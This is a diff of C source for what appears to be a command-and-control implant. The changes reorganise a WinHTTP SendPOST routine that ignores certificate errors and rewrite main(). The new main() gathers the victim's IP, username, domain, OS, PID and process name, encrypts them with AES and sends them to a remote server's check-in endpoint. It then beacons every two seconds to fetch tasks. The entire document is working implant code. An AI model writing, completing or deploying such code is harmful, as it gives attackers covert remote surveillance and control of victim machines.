@@ -344,131 +344,6 @@ BOOL GetProcessName(char *process_name, DWORD size)
     return TRUE;
 }
 
-// Function to send HTTP POST request with encrypted and base64 encoded data
-BOOL SendPOST(const wchar_t *server, int port, const wchar_t *path, const char *data, const char *session, char *response, DWORD response_size)
-{
-    HINTERNET hSession, hConnect, hRequest;
-    BOOL result = FALSE;
-    DWORD dwError = 0;
-    DWORD dwSize = 0, dwDownloaded = 0;
-    LPSTR pszOutBuffer = NULL;
-
-    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession)
-    {
-        dwError = GetLastError();
-        printf("Error in WinHttpOpen: %lu\n", dwError);
-        return FALSE;
-    }
-
-    hConnect = WinHttpConnect(hSession, server, port, 0);
-    if (!hConnect)
-    {
-        dwError = GetLastError();
-        printf("Error in WinHttpConnect: %lu\n", dwError);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hRequest)
-    {
-        dwError = GetLastError();
-        printf("Error in WinHttpOpenRequest: %lu\n", dwError);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    // Ignore certificate validation errors (for self-signed certificates)
-    DWORD dwOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOptions, sizeof(dwOptions)))
-    {
-        dwError = GetLastError();
-        printf("Error in WinHttpSetOption: %lu\n", dwError);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    // Set headers: X-Unique-Identifier and Content-Type
-    wchar_t headers[512];
-    swprintf(headers, sizeof(headers) / sizeof(wchar_t), L"X-Unique-Identifier: %hs\r\nContent-Type: text/plain", session);
-
-    // Debugging print
-    wprintf(L"Headers: %s\n", headers);
-
-    if (!WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD))
-    {
-        dwError = GetLastError();
-        printf("Error in WinHttpAddRequestHeaders: %lu\n", dwError);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    // Send request with Base64-encoded encrypted data
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)data, (DWORD)strlen(data), (DWORD)strlen(data), 0))
-    {
-        dwError = GetLastError();
-        printf("Error in WinHttpSendRequest: %lu\n", dwError);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        dwError = GetLastError();
-        printf("Error in WinHttpReceiveResponse: %lu\n", dwError);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    do {
-        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
-            dwError = GetLastError();
-            printf("Error in WinHttpQueryDataAvailable: %lu\n", dwError);
-            break;
-        }
-
-        pszOutBuffer = (LPSTR)malloc(dwSize + 1);
-        if (!pszOutBuffer) {
-            printf("Memory allocation failed\n");
-            break;
-        }
-
-        ZeroMemory(pszOutBuffer, dwSize + 1);
-
-        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
-            dwError = GetLastError();
-            printf("Error in WinHttpReadData: %lu\n", dwError);
-            free(pszOutBuffer);
-            break;
-        }
-
-        // Directly append the response to the buffer without decryption
-        if (dwDownloaded > 0 && (strlen(response) + dwDownloaded < response_size)) {
-            strncat_s(response, response_size, pszOutBuffer, dwDownloaded);
-        }
-
-        free(pszOutBuffer);
-
-    } while (dwSize > 0);
-
-    result = TRUE;
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-
-    return result;
-}
-
 void escape_json_string(const char *input, char *output, size_t output_size)
 {
     const char *src = input;
@@ -490,69 +365,115 @@ void escape_json_string(const char *input, char *output, size_t output_size)
     *dest = '\0'; // Null-terminate the string
 }
 
+// Function to send HTTP POST request with encrypted and base64-encoded data
+BOOL SendPOST(const wchar_t *server, int port, const wchar_t *path, const char *data, const char *session, char *response, DWORD response_size) {
+    HINTERNET hSession, hConnect, hRequest;
+    BOOL result = FALSE;
+    DWORD dwError = 0;
+    DWORD dwSize = 0, dwDownloaded = 0;
+    LPSTR pszOutBuffer = NULL;
+
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        dwError = GetLastError();
+        return FALSE;
+    }
+
+    hConnect = WinHttpConnect(hSession, server, port, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    DWORD dwOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOptions, sizeof(dwOptions));
+
+    wchar_t headers[512];
+    swprintf(headers, sizeof(headers) / sizeof(wchar_t), L"X-Unique-Identifier: %hs\r\nContent-Type: text/plain", session);
+
+    if (!WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)data, (DWORD)strlen(data), (DWORD)strlen(data), 0)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    if (!WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    do {
+        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+
+        pszOutBuffer = (LPSTR)malloc(dwSize + 1);
+        if (!pszOutBuffer) break;
+
+        ZeroMemory(pszOutBuffer, dwSize + 1);
+        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) break;
+
+        if (dwDownloaded > 0 && (strlen(response) + dwDownloaded < response_size)) {
+            strncat_s(response, response_size, pszOutBuffer, dwDownloaded);
+        }
+
+        free(pszOutBuffer);
+    } while (dwSize > 0);
+
+    result = TRUE;
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return result;
+}
+
 // Main function
-int main()
-{
+int main() {
     ImpInfo info;
     char token[256] = {0};
-    BYTE iv[16] = {0}; // Initialization Vector (all zeros for simplicity)
-
+    BYTE iv[16] = {0};
     BYTE *aes_key = NULL;
     DWORD aes_key_len = 0;
 
-    // Decode the AES key from Base64
-    if (!Base64UrlDecode(AES_KEY_BASE64, &aes_key, &aes_key_len) || aes_key_len != 32)
-    {
+    if (!Base64UrlDecode(AES_KEY_BASE64, &aes_key, &aes_key_len) || aes_key_len != 32) {
         printf("Failed to decode AES key.\n");
         return 1;
     }
 
     // Gather system information
     strncpy_s(info.session, sizeof(info.session), SESSION, _TRUNCATE);
-
-    if (!GetExternalIP(info.ip, sizeof(info.ip)))
-    {
-        strncpy_s(info.ip, sizeof(info.ip), "Unknown", _TRUNCATE);
-    }
-
-    if (!GetUsername(info.username, sizeof(info.username)))
-    {
-        strncpy_s(info.username, sizeof(info.username), "Unknown\\Unknown", _TRUNCATE);
-    }
-
-    if (!GetDomain(info.domain, sizeof(info.domain)))
-    {
-        strncpy_s(info.domain, sizeof(info.domain), "Unknown", _TRUNCATE);
-    }
-
-    if (!GetOSVersion(info.os_version, sizeof(info.os_version)))
-    {
-        strncpy_s(info.os_version, sizeof(info.os_version), "Unknown", _TRUNCATE);
-    }
-
-    if (!GetPID(info.imp_pid, sizeof(info.imp_pid)))
-    {
-        strncpy_s(info.imp_pid, sizeof(info.imp_pid), "Unknown", _TRUNCATE);
-    }
-
-    if (!GetProcessName(info.process_name, sizeof(info.process_name)))
-    {
-        strncpy_s(info.process_name, sizeof(info.process_name), "Unknown", _TRUNCATE);
-    }
-
-    snprintf(info.sleep_time, sizeof(info.sleep_time), "%d", 2); // Set sleep time
+    GetExternalIP(info.ip, sizeof(info.ip));
+    GetUsername(info.username, sizeof(info.username));
+    GetDomain(info.domain, sizeof(info.domain));
+    GetOSVersion(info.os_version, sizeof(info.os_version));
+    GetPID(info.imp_pid, sizeof(info.imp_pid));
+    GetProcessName(info.process_name, sizeof(info.process_name));
+    snprintf(info.sleep_time, sizeof(info.sleep_time), "%d", 2);
 
     printf("Initialized ImpInfo: {\"session\": \"%s\", \"ip\": \"%s\", \"username\": \"%s\", \"domain\": \"%s\", \"os\": \"%s\", \"imp_pid\": \"%s\", \"process_name\": \"%s\", \"sleep\": \"%s\"}\n",
-           info.session, info.ip, info.username, info.domain,
-           info.os_version, info.imp_pid, info.process_name, info.sleep_time);
+           info.session, info.ip, info.username, info.domain, info.os_version, info.imp_pid, info.process_name, info.sleep_time);
 
-    // Main loop to interact with server (simulating the send_request function from Python)
-    while (1)
-    {
-        char response[BUFFER_SIZE] = {0};
-        char request_body[BUFFER_SIZE] = {0};
-        BYTE encrypted_data[BUFFER_SIZE] = {0};
-        DWORD encrypted_data_len = sizeof(encrypted_data);
+    // First check-in to retrieve the session token
+    char response[BUFFER_SIZE] = {0};
+    char request_body[BUFFER_SIZE] = {0};
+    BYTE encrypted_data[BUFFER_SIZE] = {0};
+    DWORD encrypted_data_len = sizeof(encrypted_data);
 
         char escaped_username[512] = {0};
         escape_json_string(info.username, escaped_username, sizeof(escaped_username));
@@ -560,35 +481,52 @@ int main()
         snprintf(request_body, BUFFER_SIZE, "{\"session\":\"%s\", \"ip\":\"%s\", \"username\":\"%s\", \"domain\":\"%s\", \"os\":\"%s\", \"imp_pid\":\"%s\", \"process_name\":\"%s\", \"sleep\":\"%s\"}",
                  info.session, info.ip, escaped_username, info.domain, info.os_version, info.imp_pid, info.process_name, info.sleep_time);
 
-        // Encrypt the request body
-        if (!AES256Encrypt(aes_key, (BYTE *)request_body, strlen(request_body), iv, encrypted_data, &encrypted_data_len))
-        {
-            printf("Failed to encrypt data.\n");
-            free(aes_key);
-            return 1;
+    if (!AES256Encrypt(aes_key, (BYTE *)request_body, strlen(request_body), iv, encrypted_data, &encrypted_data_len)) {
+        printf("Failed to encrypt data.\n");
+        free(aes_key);
+        return 1;
+    }
+
+    char base64_encoded_data[BUFFER_SIZE] = {0};
+    if (!Base64UrlEncode(encrypted_data, encrypted_data_len, base64_encoded_data, sizeof(base64_encoded_data))) {
+        printf("Failed to Base64 encode data.\n");
+        free(aes_key);
+        return 1;
+    }
+
+    if (!SendPOST(SERVER, PORT, L"/js", base64_encoded_data, info.session, response, sizeof(response))) {
+        printf("Failed to send check-in.\n");
+        Sleep(2000);
+        return 1;
+    }
+
+    printf("Received session token: %s\n", response);
+    strncpy_s(token, sizeof(token), response, _TRUNCATE);
+
+    // Use session token for task requests
+    while (1) {
+        char task_response[BUFFER_SIZE] = {0};
+        char sleep_payload[256] = "{\"sleep\":\"2\"}";
+
+        if (!AES256Encrypt(aes_key, (BYTE *)sleep_payload, strlen(sleep_payload), iv, encrypted_data, &encrypted_data_len)) {
+            printf("Failed to encrypt sleep payload.\n");
+            break;
         }
 
-        // Base64 encode the encrypted data
-        char base64_encoded_data[BUFFER_SIZE] = {0};
-        if (!Base64UrlEncode(encrypted_data, encrypted_data_len, base64_encoded_data, sizeof(base64_encoded_data)))
-        {
-            printf("Failed to Base64 encode data.\n");
-            free(aes_key);
-            return 1;
+        if (!Base64UrlEncode(encrypted_data, encrypted_data_len, base64_encoded_data, sizeof(base64_encoded_data))) {
+            printf("Failed to Base64 encode sleep payload.\n");
+            break;
         }
 
-        // Send POST request to /js (check-in endpoint)
-        if (!SendPOST(SERVER, PORT, L"/js", base64_encoded_data, info.session, response, sizeof(response)))
-        {
-            printf("Failed to send checkin.\n");
-            Sleep(2000); // Sleep before retrying
+        if (!SendPOST(SERVER, PORT, L"/index", base64_encoded_data, token, task_response, sizeof(task_response))) {
+            printf("Failed to retrieve tasks.\n");
+            Sleep(2000);
             continue;
         }
 
-        printf("Received response: %s\n", response);
+        printf("Received tasks: %s\n", task_response);
 
-        // Simulate a sleep for the implant
-        Sleep(2000); // Sleep time of 2 seconds
+        Sleep(2000);
     }
 
     free(aes_key);
